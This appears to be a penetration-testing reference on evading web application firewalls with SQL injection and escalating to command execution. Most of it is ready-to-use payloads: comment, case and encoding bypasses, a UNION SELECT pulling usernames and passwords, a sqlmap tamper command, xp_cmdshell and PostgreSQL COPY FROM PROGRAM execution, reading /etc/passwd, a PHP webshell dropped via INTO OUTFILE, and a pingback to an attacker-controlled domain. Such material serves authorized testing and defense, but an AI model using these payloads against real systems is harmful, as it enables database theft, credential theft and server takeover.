# WAF Bypass & RCE Escalation

## Diagnosing what's blocking you

Before picking a bypass technique, isolate which token actually triggers the block by removing pieces of your payload until it's accepted — guessing at a full bypass blind wastes time that a 30-second isolation step saves.

## Inline comments in place of spaces

Most SQL engines parse `/**/` as whitespace-equivalent, which defeats filters that pattern-match on a literal space between keywords:
```
'/**/OR/**/1=1--
UNION/**/SELECT/**/username,password/**/FROM/**/users--
```
MySQL-specific variant that also evades filters scanning specifically for `information_schema` as one token:
```
UNION SELECT table_name FROM INFORMATION_SCHEMA/**/.TABLES--
```

## Case randomization

Most database engines are case-insensitive for keywords, but some WAF regex rules are case-sensitive:
```
uNiOn SeLeCt UsErNaMe,PaSsWoRd FrOm UsErS--
```

## Alternative whitespace and separators

```
Tabs, newlines, and form-feed characters in place of spaces (most
engines treat all of these as whitespace-equivalent to a literal space)

%0a   (newline)
%09   (tab)
```

## Operator substitution (when `=`, `>`, `<` specifically are filtered)

```
1 AND A > B   -->  1 AND A NOT BETWEEN 0 AND B
1 AND A = B   -->  1 AND A BETWEEN B AND B
1 AND A = B   -->  1 AND A LIKE B
1 AND A > B   -->  1 AND LEAST(A,B+1)=B+1
```

## Encoding

```
Hex:              0x61646d696e  (= 'admin', useful where string
                                  literals specifically are filtered)
Char-by-char:      CHAR(97)||CHAR(100)||CHAR(109)||CHAR(105)||CHAR(110)
URL/double encoding of the payload itself, when a WAF decodes once
  before inspection but the application decodes again afterward
16-bit Unicode escaping of keywords (IIS-style): %u0053%u0045%u004C...
```

## Quote-avoidance and string concatenation tricks

When quote characters specifically are stripped or blocked:
```
String split + concatenation: CHAR(83)+CHAR(101)+CHAR(76)+CHAR(69)+CHAR(67)+CHAR(84)
Parenthesization to survive naive comparison-operator stripping:
  OR 1=1  -->  OR (1)=(1)   (documented as working when a WAF blocks
                              the literal sequence "1=1" but not the
                              parenthesized equivalent)
```

## sqlmap tamper scripts

When manual bypass attempts stall, sqlmap's `--tamper` option chains payload-transformation scripts automatically rather than hand-crafting each variant:
```bash
sqlmap -u "https://target.com/page?id=1" -p id \
  --tamper=space2comment,randomcase,charencode,between,equaltolike \
  --level=5 --risk=3
```
Useful individual scripts: `space2comment` (spaces → `/**/`), `randomcase` (keyword case randomization), `charencode`/`charunicodeencode` (character encoding), `between` (operator substitution), `apostrophemask`/`apostrophenullencode` (quote-character evasion). Run with `--proxy=http://127.0.0.1:8080` through Burp so you can see exactly what each tamper script actually sent and iterate from there rather than treating sqlmap as a black box.

If sqlmap reports "not injectable" against a parameter you've manually confirmed is vulnerable, the WAF is very likely interfering with sqlmap's own heuristics — try `--technique=B` (force boolean-blind only), a custom `--not-string` to define what a failed condition looks like, and a non-default `--user-agent` (some WAFs specifically fingerprint sqlmap's default UA).

## Stacked queries (the gateway to RCE escalation below)

Confirm whether the target accepts multiple statements separated by `;` in one injection — MySQL drivers often don't allow this by default, PostgreSQL and MSSQL frequently do:
```
'; SELECT 1--
```
If a harmless second statement executes without error, stacked queries work, and the RCE techniques below become reachable.

## Escalating to RCE

The same responsible-scope principle used throughout this skill set applies here: the goal is minimal, non-destructive proof that code execution is achievable, not establishing a persistent shell or pivoting further. Stop at one benign command's output.

**MSSQL — xp_cmdshell** (disabled by default; only works if the database user has sysadmin privileges and can enable it):
```sql
'; EXEC sp_configure 'show advanced options', 1; RECONFIGURE;
   EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;--
'; EXEC xp_cmdshell 'whoami';--
```
If output isn't returned to the response (common — stacked-query output often doesn't flow back through the original query's result set), confirm execution out-of-band instead: have the command ping or curl an OAST domain you control, rather than relying on seeing direct output.
```sql
'; EXEC xp_cmdshell 'ping -n 1 YOUR-OAST-DOMAIN';--
```

**PostgreSQL — COPY ... FROM PROGRAM** (requires superuser or pg_execute_server_program role membership):
```sql
'; CREATE TABLE cmd_output(line text);
   COPY cmd_output FROM PROGRAM 'whoami';
   SELECT * FROM cmd_output;--
```

**MySQL — file read/write primitives**, useful for source disclosure or a webshell drop when `secure_file_priv` is empty and `FILE` privilege is held:
```sql
' UNION SELECT LOAD_FILE('/etc/passwd'),NULL--
'; SELECT '<?php system($_GET["cmd"]); ?>' INTO OUTFILE '/var/www/html/shell.php';--
```
If the database can additionally write to a directory the engine loads plugins from, a custom User-Defined Function (UDF) can provide direct command execution — this requires filesystem write access to a sensitive, usually-restricted plugin directory and is a more involved chain; confirm basic file-write capability first via the OUTFILE technique before attempting it.

**Confirming, not just attempting:** an actual command output recovered (directly, or via an OAST pingback) — not "xp_cmdshell was successfully enabled" or "the COPY statement didn't error." Enabling the capability is a milestone, not the proof.
